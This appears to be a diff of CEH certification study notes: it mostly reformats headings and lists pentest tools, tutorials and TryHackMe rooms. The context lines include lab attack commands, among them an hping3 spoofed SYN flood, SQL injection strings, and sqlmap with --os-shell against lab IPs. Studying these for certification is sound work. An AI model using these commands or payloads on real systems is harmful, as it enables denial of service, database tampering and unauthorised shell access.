@@ -5,19 +5,19 @@
 - wpscan - https://www.poftut.com/how-to-scan-wordpress-sites-with-wpscan-tutorial-for-security-vulnerabilities/
 - hydra - https://securitytutorials.co.uk/brute-forcing-passwords-with-thc-hydra/
 - john - https://linuxconfig.org/password-cracking-with-john-the-ripper-on-linux
-- hashcat
+- hashcat - https://hashcat.net/wiki/doku.php?id=example_hashes
 - responder - https://notsosecure.com/pwning-with-responder-a-pentesters-guide/
 - CEHv10 iLAB Videos  https://www.youtube.com/playlist?list=PLWGnVet-gN_kGHSHbWbeI0gtfYx3PnDZO
 - Ethical Hacking Labs -https://github.com/Samsar4/Ethical-Hacking-Labs
 
-###### TryHackMe Rooms
+##### TryHackMe Rooms
 - WebAppSec101 - https://tryhackme.com/room/webappsec101
 - Daily Bugle - https://tryhackme.com/room/dailybugle
 - Hydra - https://tryhackme.com/room/hydra
 - CrackTheHash - https://tryhackme.com/room/crackthehash
 
 
-####### Discovery
+##### Discovery
 netdiscover -i eth0
 fping -a -g subnet 2>/dev/null
 nmap -p- 10.10.10.10
@@ -63,9 +63,9 @@ searchsploit
  - searchsploit -p 7618[.c] — Show complete path
  - searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
 
-###### Tools that are used in the iLABS
+#### Tools that are used in the iLABS
 
-###### Module 2 - Footprinting and Reconaisance 
+##### Module 2 - Footprinting and Reconaisance 
 tracert/traceroute
 ping
 firebug plugin (old) for browser (same as web developer tools)
@@ -88,7 +88,7 @@ metasploit
     - run
     - os_flavor
                
-###### Module 4 - Enumeration
+##### Module 4 - Enumeration
    GNI (Global Network Inventory
    Advanced IP Scanner
    SuperScan
@@ -120,12 +120,12 @@ metasploit
    enum4linux -u user -p passwd -G 10.10.10.12 groups
    enum4linux -u user -p passwd -S 10.10.10.12 share policy 
     
- ###### Module 5 - Vulnerability Analysis
+##### Module 5 - Vulnerability Analysis
     
    Nessus
    Nikto -h 10.10.10.12 -Tuning 1
     
-###### Module 6 - System hacking
+##### Module 6 - System hacking
     
    RainbowCrack
    Whitespace Stego
@@ -134,17 +134,17 @@ metasploit
    OpenStego
    QuickStego
     
-###### Module 9 - Social Engineering
+##### Module 9 - Social Engineering
     
    SET toolkit
     
-###### Module 10 - Denial of Service
+##### Module 10 - Denial of Service
     
    wireshark - tcp filter
    hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 --flood
    HOIC (high orbit Ion Cannon)
     
-###### Module 11 - Session Hijacking
+##### Module 11 - Session Hijacking
     
    OWASP ZAP
    Burpsuite
@@ -163,7 +163,7 @@ metasploit
    uniscan -u http://10.10.10.12 -we (robots.txt and sitemap.txt
    uniscan -u http://10.10.10.12 -d dynamic scan (blind SQL)
     
-###### Module 14 Hacking Web Applications
+##### Module 14 Hacking Web Applications
     
    parameter  tampering
     When logged into site with user the following url will show in the address bar 
@@ -223,7 +223,7 @@ metasploit
    save as Security_Script.html
     
     
-####### Module 15 - SQL Injection
+##### Module 15 - SQL Injection
     
    blah' or 1=1 --
    blah';insert into login values('jon','pass'); --
@@ -243,7 +243,7 @@ metasploit
    sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --os-shell
     
     
-###### Module 20 - Cryptography
+##### Module 20 - Cryptography
     
    HashCalc
    md5calc
